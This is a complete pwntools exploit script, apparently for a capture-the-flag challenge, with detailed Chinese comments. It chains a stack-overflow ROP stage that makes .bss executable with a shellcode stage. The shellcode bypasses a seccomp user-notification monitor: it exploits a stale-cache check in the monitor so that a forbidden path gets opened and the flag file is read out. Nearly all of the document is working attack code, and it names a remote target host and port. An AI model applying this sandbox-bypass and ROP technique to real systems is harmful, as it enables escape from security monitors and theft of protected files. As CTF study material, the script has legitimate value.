#!/usr/bin/env python3
# 使用 pwntools 控制进程、打包 ROP 数据、汇编 shellcode。
from pwn import *

# 告诉 pwntools：后面生成的汇编代码是 Linux amd64 架构。
context.clear(arch="amd64", os="linux" , log_level = 'debug')

# 远程靶机信息。当前脚本下面使用的是 process("./pwn") 本地启动，
# HOST/PORT 只是预留给切换 remote(HOST, PORT) 时使用。
HOST = args.HOST or "60.205.163.215"
PORT = int(args.PORT or 28317)

# pop rdi; pop rbp; ret。这个 gadget 会额外弹出一个 rbp，
# 所以 set_rdi() 里需要在真正的 rdi 参数后面补一个占位值。
POP_RDI_RBP = 0x40411D
# pop rsi; ret，用来控制第二个参数 rsi。
POP_RSI = 0x4016A5
# pop rax; ret。这里用它配合 xchg rdx, rax 间接控制 rdx。
POP_RAX = 0x423883
# pop rcx; ret。后面的 syscall wrapper 会把 rcx 当作第三个参数传递。
POP_RCX = 0x40DC51
# xchg rdx, rax; ret。先把值放入 rax，再交换到 rdx。
XCHG_RDX_RAX = 0x41925A
# 程序内部 read 封装函数地址，效果等价于 read(fd, buf, size)。
READ = 0x41B760
# 通用 syscall 封装函数地址，ROP 链通过它调用 mprotect。
SYSCALL_ANY = 0x41C320

# 可写的 .bss 地址，用作第二阶段 shellcode 的落点。
BSS = 0x4C9000
# 另一块 .bss 缓冲区，用来保存从 flag 文件中读出的内容。
FLAG_BUF = BSS + 0x500
# 父进程 seccomp notification 逻辑重点检查的固定虚拟地址。
PATH = 0x13370000


def set_rdi(value):
    # 构造设置 rdi=value 所需的栈数据；最后的 0 是给 pop rbp 的占位。
    return [POP_RDI_RBP, value, 0]


def set_rsi(value):
    # 构造设置 rsi=value 所需的栈数据。
    return [POP_RSI, value]


def set_rdx(value):
    # 没有直接可用的 pop rdx gadget，所以先设置 rax，再交换 rax/rdx。
    return [POP_RAX, value, XCHG_RDX_RAX]


def set_rcx(value):
    # 构造设置 rcx=value 所需的栈数据，供 syscall wrapper 使用。
    return [POP_RCX, value]


def call_read(fd, buf, size):
    # 返回一段调用 read(fd, buf, size) 的 ROP 片段。
    return set_rdi(fd) + set_rsi(buf) + set_rdx(size) + [READ]


def call_mprotect(addr, size, prot):
    # SYSCALL_ANY 的调用形式类似 syscall(number, arg1, arg2, arg3, ...)。
    # 这里 number=10，也就是 __NR_mprotect，
    # 因此整体效果是 mprotect(addr, size, prot)。
    return (
        set_rdi(10)
        + set_rsi(addr)
        + set_rdx(size)
        + set_rcx(prot)
        + [SYSCALL_ANY, POP_RAX, 0]
    )


def build_stage1():
    # 第一阶段是短 ROP 链，放在第一次溢出的 read 输入里。
    chain = []
    # 漏洞函数 ret 到 ROP 链后，再从 stdin 读入第二阶段 shellcode 到 .bss。
    chain += call_read(0, BSS, 0x400)
    # 把 .bss 改成可读、可写、可执行，保证 shellcode 可以运行。
    chain += call_mprotect(BSS, 0x1000, 7)
    # 最后跳到 .bss。此时 .bss 中已经是第二阶段 shellcode。
    chain += [BSS]
    # 漏洞栈缓冲区大小是 0x48 字节。
    # flat({0x48: chain}) 会把保存的 RIP 精确覆盖到偏移 0x48 处。
    # 最后补齐到 0x200，是因为漏洞 read 最多读 512 字节，程序还会原样回显。
    return flat({0x48: flat(chain)}, filler=b"A").ljust(0x200, b"B")


def build_stage2():
    # 第二阶段是原始 shellcode。
    # 它利用父进程 seccomp user notification 的缓存检查缺陷，
    # 让 open(PATH) 通过 "dobedobedo" 校验，但子进程实际打开 ./flag。
    return asm(
        f"""
        /* mmap(PATH, 0x1000, PROT_READ|PROT_WRITE,
           MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0).
           在 0x13370000 精确映射一页内存，这个地址正是父进程
           seccomp 监控逻辑会检查的地址。 */
        mov eax, 9              /* rax = __NR_mmap */
        mov edi, {PATH}         /* rdi = 请求映射的地址 */
        mov esi, 0x1000         /* rsi = 映射长度 */
        mov edx, 3              /* rdx = PROT_READ | PROT_WRITE */
        mov r10d, 0x32          /* r10 = MAP_PRIVATE | MAP_FIXED | MAP_ANON */
        mov r8, -1              /* r8 = fd，匿名映射中无实际用途 */
        xor r9d, r9d            /* r9 = 偏移 0 */
        syscall                 /* 创建可控页面 */

        /* 在 PATH 写入 "dobedobedo"。
           父进程判断 open syscall 是否允许时，会期待读到这个字符串。 */
        mov rdi, {PATH}                 /* rdi 指向可控内存 */
        mov rax, 0x65626f6465626f64     /* 小端字节序："dobedobe" */
        mov qword ptr [rdi], rax        /* 写入前 8 字节 */
        mov dword ptr [rdi+8], 0x6f64   /* 追加 "do\\0\\0" */

        /* 第一次 open(PATH, O_RDONLY)。
           这次尝试打开的是 "dobedobedo"，文件打开通常会失败；
           真正目的只是让父进程成功把 "dobedobedo" 复制到缓存里。 */
        mov eax, 2              /* rax = __NR_open */
        mov rdi, {PATH}         /* rdi = 指向 "dobedobedo" 的指针 */
        xor esi, esi            /* rsi = O_RDONLY */
        xor edx, edx            /* rdx = mode 0 */
        syscall                 /* 触发父进程成功填充缓存 */

        /* 把被检查的内存替换成 "./flag"，用于本地测试。
           Docker/远程服务通常使用绝对路径 "/flag"。 */
        mov rdi, {PATH}                 /* rdi 指向可控内存 */
        mov rax, 0x67616c662f2e         /* 小端字节序："./flag" */
        mov qword ptr [rdi], rax        /* 覆盖路径字符串 */

        /* mprotect(PATH, 0x1000, PROT_WRITE)。
           去掉 PROT_READ 后，父进程后续 process_vm_readv 会读取失败；
           但父进程不检查失败返回值，因此仍保留旧缓存 "dobedobedo"。 */
        mov eax, 10             /* rax = __NR_mprotect */
        mov rdi, {PATH}         /* rdi = 可控页面地址 */
        mov esi, 0x1000         /* rsi = 页面长度 */
        mov edx, 2              /* rdx = 仅 PROT_WRITE */
        syscall                 /* 让 process_vm_readv 因不可读而失败 */

        /* 第二次 open(PATH, O_RDONLY)。
           父进程看到 PATH 后尝试重新读取，但这次读取失败；
           它随后拿旧缓存和 "dobedobedo" 比较，误以为校验通过，
           因而允许 syscall 继续执行。子进程实际打开的是 "./flag"。 */
        mov eax, 2              /* rax = __NR_open */
        mov rdi, {PATH}         /* rdi = 指向 "./flag" 的指针 */
        xor esi, esi            /* rsi = O_RDONLY */
        xor edx, edx            /* rdx = mode 0 */
        syscall                 /* 借助父进程旧缓存绕过 open 检查 */

        /* read(flag_fd, FLAG_BUF, 0x100)。open 返回的 fd 保存在 rax 中。 */
        mov rdi, rax            /* rdi = open 返回的 fd */
        xor eax, eax            /* rax = __NR_read */
        mov esi, {FLAG_BUF}     /* rsi = .bss 中的输出缓冲区 */
        mov edx, 0x100          /* rdx = 最大读取长度 */
        syscall                 /* 读取 flag 内容 */

        /* write(1, FLAG_BUF, bytes_read)，把 flag 打印到 stdout。 */
        mov edx, eax            /* rdx = 实际读取的字节数 */
        mov eax, 1              /* rax = __NR_write */
        mov edi, 1              /* rdi = stdout */
        mov esi, {FLAG_BUF}     /* rsi = flag 缓冲区 */
        syscall                 /* 输出 flag */

        /* exit(0)，输出完成后干净退出。 */
        mov eax, 60             /* rax = __NR_exit */
        xor edi, edi            /* rdi = 退出状态 0 */
        syscall                 /* 结束子进程 */
        """
    )


def main():
    # 启动本地题目程序。打远程时可以改成 remote(HOST, PORT)。
    io = process("./pwn")
    # 构造第一阶段 ROP payload。
    stage1 = build_stage1()
    # 先发送 0x200 字节 stage1，后面紧跟 stage2。
    # 漏洞 read 会先消耗并回显 stage1；随后 ROP 链中的 read 再把 stage2 读入 .bss。
    io.send(stage1 + build_stage2())
    # 丢弃程序对前 0x200 字节的回显，这样后面只显示 shellcode 打印出的 flag。
    io.recvn(len(stage1))
    # 接收 shellcode 最后 write(1, flag, len) 的输出并打印。
    print(io.recvall(timeout=3).decode(errors="ignore"), end="")


if __name__ == "__main__":
    # 执行 exploit。
    main()
